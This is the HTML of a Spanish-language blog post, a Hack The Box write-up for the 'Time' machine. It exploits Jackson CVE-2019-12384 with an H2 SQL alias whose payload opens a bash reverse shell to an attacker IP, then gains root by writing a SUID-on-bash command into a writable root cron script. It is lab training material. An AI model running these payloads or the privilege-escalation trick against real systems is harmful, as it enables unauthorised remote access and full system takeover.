@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Time - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Time - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hoy vamos a resolver la máquina Time de la plataforma de hackthebox correspondiente a una linux dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de Jackson CVE-2019-12384, y aprovecharemos la vulnerabilidad SSRF derivandola en una ejecucion remota de comandos RCE que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea Cron podamos obtener acceso como el usuario root." />
+<meta property="og:description" content="Hoy vamos a resolver la máquina Time de la plataforma de hackthebox correspondiente a una linux dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de Jackson CVE-2019-12384, y aprovecharemos la vulnerabilidad SSRF derivandola en una ejecucion remota de comandos RCE que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea Cron podamos obtener acceso como el usuario root." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Time" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Time" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Time/banner.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-12T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Time/banner.jpg" />
+<meta property="twitter:title" content="Maquina Time - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-12T00:00:00+00:00","datePublished":"2023-06-12T00:00:00+00:00","description":"Hoy vamos a resolver la máquina Time de la plataforma de hackthebox correspondiente a una linux dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de Jackson CVE-2019-12384, y aprovecharemos la vulnerabilidad SSRF derivandola en una ejecucion remota de comandos RCE que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea Cron podamos obtener acceso como el usuario root.","headline":"Maquina Time - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Time/banner.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Time"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Time"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Time - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-12">12 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Time/banner.jpg" alt="Maquina Time - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hoy vamos a resolver la máquina <code>Time</code> de la plataforma de <code>hackthebox</code> correspondiente a una <code>linux</code> dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de <code>Jackson CVE-2019-12384</code>, y aprovecharemos la vulnerabilidad <code>SSRF</code> derivandola en una ejecucion remota de comandos <code>RCE</code> que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea <code>Cron</code> podamos obtener acceso como el usuario <code>root</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Time
+❯ ls
+ Time
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.214
+PING 10.10.10.214 (10.10.10.214) 56(84) bytes of data.
+64 bytes from 10.10.10.214: icmp_seq=1 ttl=63 time=133 ms
+
+--- 10.10.10.214 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 133.374/133.374/133.374/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>allPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.214 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:48 GMT
+Initiating SYN Stealth Scan at 20:48
+Scanning 10.10.10.214 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.214
+Discovered open port 22/tcp on 10.10.10.214
+Completed SYN Stealth Scan at 20:49, 17.83s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.214
+Host is up, received user-set (0.15s latency).
+Scanned at 2023-06-12 20:48:51 GMT for 18s
+Not shown: 65476 closed tcp ports (reset), 57 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
+           Raw packets sent: 87623 (3.855MB) | Rcvd: 86271 (3.451MB)
+</code></pre>
+<p>Podemos ver que los puertos que se encuentran abiertos son el puerto <code>22 ssh</code> y el <code>80 http</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,80 10.10.10.214 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:49 GMT
+Nmap scan report for 10.10.10.214
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
+|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
+|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Online JSON parser
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.41</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Seguidamente vamos a usar la herramienta <code>whatweb</code> para ver por consola el gestor de contenido de la pagina web.</p>
+
+<pre><code class="language-python">❯ whatweb http://10.10.10.214
+http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]
+</code></pre>
+
+<p>La herramienta nos reporta que se trata de un <code>JSON parser</code></p>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Vamos a abrir la web y vemos que la pagina efectivamente es un <code>JSON parser</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Time/time1.PNG" alt="" /></p>
+
+<p>Vemos una opcion de <code>Beautify</code> que al pasarle datos en <code>JSON</code> nos lo muestra de manera mas estetica.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Time/time2.PNG" alt="" /></p>
+
+<p>Dentro de las opciones tambien podemos ver una de <code>Validate (Beta)</code>,y si procesamos una comilla nos arroja un error referente a <code>jackson java</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Time/time4.PNG" alt="" /></p>
+
+<p>Investigando un poco encontramos que existe una vulnerabilidad a una libreria <code>jackson</code> que se usa para la deserealizacion <code>JSON</code> y mediante ello podemos realizar ataques de <code>SSRF</code> y derivarlo a una ejecucion remota de comandos.</p>
+
+<p>Si deseas entender a mayor detalle la vulnerabilidad te dejo el siguiente articulo:</p>
+
+<ul>
+  <li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
+</ul>
+
+<p>Para explotar esta vulnerabilidad debemos crear un archivo <code>inject.sql</code> con el siguiente contenido:</p>
+
+<pre><code class="language-sql">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+	String[] command = {"bash", "-c", cmd};
+	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+	return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('bash -i &gt;&amp; /dev/tcp/10.10.16.3/443 0&gt;&amp;1')
+</code></pre>
+
+<p>En la función <code>shellexec</code>, introducimos el codigo que queremos que se ejecute cuando suceda la desearialización. En este caso introduciremos una instrucción en <code>bash</code> que nos permita obtener una reverse shell.</p>
+
+<p>Lo siguiente ejecutar lo siguiente instrucción en el <code>JSON PARSER</code>, donde especificaremos nuestra ip, donde nos compartiremos el archivo <code>inject.sql</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Time/time5.PNG" alt="" /></p>
+
+<p>Ahora nos compartimos el archivo, usando python.</p>
+
+<pre><code class="language-python">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>Seguidamente nos ponemos en escucha en el puerto especifico, en este caso el <code>443</code> y enviamos la instrucción.</p>
+
+<p>Recibimos la petición</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.214 - - [12/Jun/2023 23:13:26] "GET /inject.sql HTTP/1.1" 200 -
+</code></pre>
+
+<p>y obnenemos acceso como el usuario <code>pericles</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.214.
+Ncat: Connection from 10.10.10.214:38128.
+bash: cannot set terminal process group (857): Inappropriate ioctl for device
+bash: no job control in this shell
+pericles@time:/var/www/html$ whoami
+whoami
+pericles
+pericles@time:/var/www/html$
+</code></pre>
+
+<p>Como siempre vamos a configurar nuestra <code>tty</code> full interactiva</p>
+
+<pre><code class="language-bash">pericles@time:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+pericles@time:/var/www/html$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+pericles@time:/var/www/html$ export TERM=xterm
+pericles@time:/var/www/html$ export SHELL=bash 
+pericles@time:/var/www/html$ stty rows 45 columns 184
+</code></pre>
+<p>Nos dirigimos al directorio personal del usuario <code>pericles</code> y visializamos la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-bash">pericles@time:/var/www/html$ cd /home
+pericles@time:/home$ ls
+pericles
+pericles@time:/home$ cd pericles/
+pericles@time:/home/pericles$ ls
+snap  user.txt
+pericles@time:/home/pericles$ cat user.txt 
+5598d4c823ca1aadd34004c1ed4cbfc8
+pericles@time:/home/pericles$ 
+</code></pre>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Para poder elevar privilegios primeramente a enumerar ver la lista de temporalizadores para ver información util sobre las tareas programadas en el sistema, utilzando el comando <code>systenctl list-timers</code>.</p>
+
+<pre><code class="language-bash">pericles@time:/home/pericles$ systemctl list-timers
+NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
+Mon 2023-06-12 23:21:41 UTC 3s left       Mon 2023-06-12 23:21:31 UTC 6s ago               timer_backup.timer           timer_backup.service          
+Mon 2023-06-12 23:39:00 UTC 17min left    Mon 2023-06-12 23:09:00 UTC 12min ago            phpsessionclean.timer        phpsessionclean.service       
+Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         logrotate.timer              logrotate.service             
+Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         man-db.timer                 man-db.service                
+Tue 2023-06-13 00:09:59 UTC 48min left    Tue 2021-02-09 14:42:14 UTC 2 years 4 months ago motd-news.timer              motd-news.service             
+Tue 2023-06-13 03:56:23 UTC 4h 34min left Thu 2020-10-22 18:44:20 UTC 2 years 7 months ago apt-daily.timer              apt-daily.service             
+Tue 2023-06-13 06:16:25 UTC 6h left       Mon 2023-06-12 21:40:37 UTC 1h 41min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service     
+Tue 2023-06-13 14:30:45 UTC 15h left      Mon 2023-06-12 22:46:51 UTC 34min ago            fwupd-refresh.timer          fwupd-refresh.service         
+Tue 2023-06-13 20:56:20 UTC 21h left      Mon 2023-06-12 20:56:20 UTC 2h 25min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Sun 2023-06-18 03:10:37 UTC 5 days left   Mon 2023-06-12 20:42:05 UTC 2h 39min ago         e2scrub_all.timer            e2scrub_all.service           
+Mon 2023-06-19 00:00:00 UTC 6 days left   Mon 2023-06-12 20:41:25 UTC 2h 40min ago         fstrim.timer                 fstrim.service                
+</code></pre>
+
+<p>Obervamos que se esta ejecutando un <code>timer_backup</code>, ahora para enumerar los procesos que se estan ejecutando en el sistema, vamos a crearnos un pequeño script en bash de nombre <code>procmon.sh</code></p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+old_process=$(ps -eo user,command)
+
+while true; do
+  new_process=$(ps -eo user,command)
+  diff &lt;(echo "$old_process") &lt;(echo "$new_process") | grep "[\&gt;\&lt;]" | grep -vE "procmon|command|kworker" 
+  old_process=$new_process
+done
+</code></pre>
+
+<p>Lo ejecutamos en la maquina victima y vemos que el usuario <code>root</code> esta ejecutando el arhivo <code>timer_backup.sh</code> a intervalos regulares de tiempo.</p>
+
+<pre><code class="language-bash">root     /bin/sh -e /usr/lib/php/sessionclean
+root     /bin/sh -e /usr/lib/php/sessionclean
+root     /lib/systemd/systemd-udevd
+root     /lib/systemd/systemd-udevd
+root     /lib/systemd/systemd-udevd
+root     /bin/bash /usr/bin/timer_backup.sh
+root     zip -r website.bak.zip /var/www/html
+root     /bin/bash /usr/bin/timer_backup.sh
+root     zip -r website.bak.zip /var/www/html
+</code></pre>
+
+<p>Viendo las propiedades del archivo, vemos que somos propieatarios, por tanto tenemos permiso de escritura.</p>
+
+<pre><code class="language-bash">pericles@time:/home/pericles$ ls -l /usr/bin/timer_backup.sh
+-rwxrw-rw- 1 pericles pericles 88 Jun 12 23:40 /usr/bin/timer_backup.sh
+pericles@time:/home/pericles$
+</code></pre>
+
+<p>Lo siguiente que haremos sera modificar el archivo, añadiendole una instruccion que nos otorgue el privilegio <code>suid</code> a la <code>bash</code>.</p>
+
+<pre><code class="language-bash">pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
+#!/bin/bash
+chmod  u+s /bin/bash
+</code></pre>
+
+<p>Ya que el usuario <code>root</code> nos ejecutara el archivo despues de unos segundos verificamos si nos asigno el permiso correspondiente a la <code>bash</code>.</p>
+
+<pre><code class="language-bash">pericles@time:/home/pericles$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
+</code></pre>
+
+<p>Lo unico que nos queda por hacer seria ejecutar <code>bash -p</code> y nos convertiriamos en el usuario <code>root</code>, ahora vamos a su directorio personal y visualizamos la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">pericles@time:/home/pericles$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+a527d7fbd3e113aeb96d956af2900de8
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Time - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Time" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
